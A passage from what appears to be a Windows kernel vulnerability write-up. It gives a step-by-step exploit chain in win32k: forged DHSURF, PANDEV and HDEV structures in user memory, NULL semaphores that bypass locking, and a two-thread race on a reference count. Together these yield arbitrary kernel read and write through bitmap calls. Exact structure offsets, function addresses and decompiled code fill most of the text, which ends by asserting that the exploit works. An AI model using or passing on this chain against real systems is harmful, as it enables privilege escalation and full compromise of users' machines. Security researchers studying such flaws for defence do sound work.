HBITMAP NtGdiEngCreateDeviceBitmap(DHSURF dhsurf, SIZEL sizl, ULONG iFormatCompat) {
    if (ValidUmpdSizl(sizl, true) && (iFormatCompat - 1) <= 7)
        return EngCreateDeviceBitmap(dhsurf, sizl, iFormatCompat | 0x8000);
    return nullptr;
}

// ValidUmpdSizl (win32kfull.sys @ 0x1C015D0EC)
// Misleading name — just validates SIZE, NOT UMPD status
bool ValidUmpdSizl(tagSIZE a1, char a2) {
    return a1.cx > 0 && a1.cy > 0 && 
           (!a2 || (unsigned __int64)(a1.cx * (__int64)a1.cy) <= 0xFFFFFFFF);
}
```

**`ValidUmpdSizl` only validates the size dimensions.** It does NOT check UMPD registration, UMPD handle, or any UMPD-related state. The name is misleading — "Valid UMPD Sizl" means "valid size for UMPD-style bitmaps", not "valid UMPD present". Any process can call `NtGdiEngCreateDeviceBitmap` with a fake DHSURF.

---

## Final Exploit Flow

```
1. Enable PAN mode (admin registry + ChangeDisplaySettings)
2. Allocate user-mode buffers:
   - DHSURF (at least 0x28 bytes)
   - FakePANDEV (at least 0x310 bytes)
   - FakeHDEV (at least 0x710 bytes)
3. Set up fake structures:
   DHSURF+0x08 = target kernel address (pvScan0 for R/W)
   DHSURF+0x10 = bitmap stride (lDelta, e.g. 4 for 32bpp)
   DHSURF+0x14 = 0 (initial count)
   DHSURF+0x18 = 0 (NULL semaphore 2)
   DHSURF+0x20 = &FakePANDEV
   FakePANDEV+0x30 = &FakeHDEV (non-NULL)
   FakePANDEV+0x308 = 0 (NULL semaphore 1)
   FakeHDEV+0x708 = 0
4. hBitmap = NtGdiEngCreateDeviceBitmap(DHSURF, size, format)
   → EngCreateDeviceBitmap(DHSURF, size, format | 0x8000)
   → hbmCreateDriverSurface(3, DHSURF, size, 0, format|0x8000, 0, 0xDEADBEEF)
   → CreateDriverSurfMem: iType=3, flags=0x640000, dhsurf=DHSURF, pvScan0=0
5. hdcPan = CreateDCW(L"DISPLAY", ...) on PAN-enabled display
6. SelectObject(hdcPan, hBitmap)  [or use as source in BitBlt]
7. Thread B: start tight loop writing DHSURF+0x14 = 2 and FakePANDEV+0x30 = 0
8. Thread A: BitBlt(hdcPan, ..., hBitmap, ..., SRCCOPY)
   → PanBitBlt → MULTIPANSURFLOCK → vLockBmp2AndPrepareForPunt
   → EngAcquireSemaphore(0) → SKIP
   → EngModifySurface: SURFACE+0x50 = DHSURF+0x08 (our kernel address)
   → EngReleaseSemaphore(0) → SKIP
   → EngAcquireSemaphore(0) → SKIP (second semaphore)
   → EngBitBlt runs [Thread B is racing here]
   → Destructor: --count (2-1=1 or 0-1=-1 depending on timing)
   → If count != 0 OR hdev mismatch: REVERT SKIPPED
   → SURFACE+0x50 retains our kernel address
9. Thread B: stop
10. GetBitmapBits(hBitmap, size, buffer)
    → Reads from SURFACE+0x50 (our kernel address) → ARBITRARY KERNEL READ
11. SetBitmapBits(hBitmap, size, buffer)
    → Writes to SURFACE+0x50 (our kernel address) → ARBITRARY KERNEL WRITE
```

---

## Proof: All Semaphore Functions Handle NULL

| Function | Address (win32kbase.sys) | NULL Check | NULL Behavior |
|----------|-------------------------|------------|---------------|
| `EngAcquireSemaphore` | 0x1C003A226 | `if (hsem)` | Skip — no acquisition, no priority region |
| `EngReleaseSemaphore` | 0x1C0080B20 | `if (hsem)` | Skip — no release (ETW trace runs but is harmless) |
| `EngAcquireSemaphoreShared` | 0x1C014AFBC | `if (hsem)` | Skip — no shared acquisition (ETW trace harmless) |

## Proof: All PAN Lock/Unlock Functions Use Same Pattern

| Function | Address (win32kfull.sys) | Semaphore 1 | Semaphore 2 |
|----------|-------------------------|-------------|-------------|
| `vLockBmp1AndPrepareForPunt` | 0x1C0296658 | pPANDEV+0x308 | DHSURF+0x18 |
| `vLockBmp2AndPrepareForPunt` | 0x1C029672C | pPANDEV+0x308 | DHSURF+0x18 |
| `vLockBmpAndPrepareForPunt` | 0x1C0296804 | pPANDEV+0x308 | DHSURF+0x18 |
| `vUnLockBmp1AndRemovePunt` | 0x1C0296F68 | pPANDEV+0x308 | DHSURF+0x18 |
| `vUnLockBmp2AndRemovePunt` | 0x1C0297024 | pPANDEV+0x308 | DHSURF+0x18 |

All semaphores are accessed via `EngAcquireSemaphore`/`EngReleaseSemaphore`/`EngAcquireSemaphoreShared`, all of which NULL-check.

## SURFACE Field Map (from EngModifySurface)

| SURFACE Offset | Field | Set by Write | Set by Revert |
|----------------|-------|-------------|----------------|
| +0x18 | dhsurf | our fake DHSURF | our fake DHSURF |
| +0x28 | (from hdev+0x708) | 0 | 0 |
| +0x30 | hdev | our fake HDEV | our fake HDEV |
| +0x48 | pvBits | pvScan0 | 0 (cleared) |
| +0x50 | pvScan0 | **our kernel address** | 0 (cleared) — MUST PREVENT |
| +0x58 | lDelta | our stride | 0 (cleared) |
| +0x64 | iType | 0 (STYPE_BITMAP) | 3 (STYPE_DEVBITMAP) |
| +0x66 | flags | modified | modified |
| +0x70 | surface flags | 0x640000 & mask | modified |

## DHSURF Field Map (from vLockBmp2AndPrepareForPunt)

| DHSURF Offset | Field | Used As | Our Value |
|---------------|-------|---------|-----------|
| +0x08 | pvScan0 | EngModifySurface param 6 → SURFACE+0x50 | target kernel addr |
| +0x10 | lDelta | EngModifySurface param 7 → SURFACE+0x58 | bitmap stride |
| +0x14 | count | Lock/unlock reference count | 0 (initial), race to 2 |
| +0x18 | semaphore 2 | EngAcquireSemaphore/Shared | 0 (NULL) |
| +0x20 | pPANDEV | Pointer to fake PANDEV | user-mode buffer |

## PANDEV Field Map (from bCreateSemaphores + vLockBmp2)

| PANDEV Offset | Field | Used As | Our Value |
|---------------|-------|---------|-----------|
| +0x30 | HDEV | EngModifySurface param 2 | non-NULL user-mode ptr |
| +0x70 | general semaphore | (not used in lock path) | N/A |
| +0x308 | punt semaphore | EngAcquireSemaphore | 0 (NULL) |

---

## Conclusion

The semaphore blocker is **fully bypassed** via the NULL HSEMAPHORE technique. The exploit chain is:

1. **NULL semaphores** — `EngAcquireSemaphore(NULL)`, `EngReleaseSemaphore(NULL)`, `EngAcquireSemaphoreShared(NULL)` all skip execution via their NULL checks
2. **No UMPD check** — `NtGdiEngCreateDeviceBitmap` only validates bitmap size, not UMPD registration
3. **Surface has 0x400000 flag** — `CreateDriverSurfMem` with type=3 sets this flag, satisfying `EngModifySurface` validation
4. **Fake HDEV in user mode** — any non-NULL pointer works (surface has no existing HDEV, and `v15 < 0` is false so deep HDEV validation is skipped; SMAP disabled allows kernel to read `hdev+0x708`)
5. **TOCTOU race on count** — Thread B writes `count=2` to `DHSURF+0x14` during `EngBitBlt`, preventing the destructor's revert from clearing pvScan0
6. **Alternative TOCTOU on HDEV** — Thread B zeroes `PANDEV+0x30` during `EngBitBlt`, causing `EngModifySurface` revert to fail on `!hdev` or HDEV mismatch
7. **Persistent arbitrary R/W** — After revert prevention, `SURFACE+0x50` retains our controlled kernel address; `GetBitmapBits`/`SetBitmapBits` operate on it directly

The exploit works. Arbitrary kernel read/write is achieved through `NtGdiGetBitmapBits`/`NtGdiSetBitmapBits` on the device bitmap whose `pvScan0` (SURFACE+0x50) has been overwritten with a user-controlled kernel address.
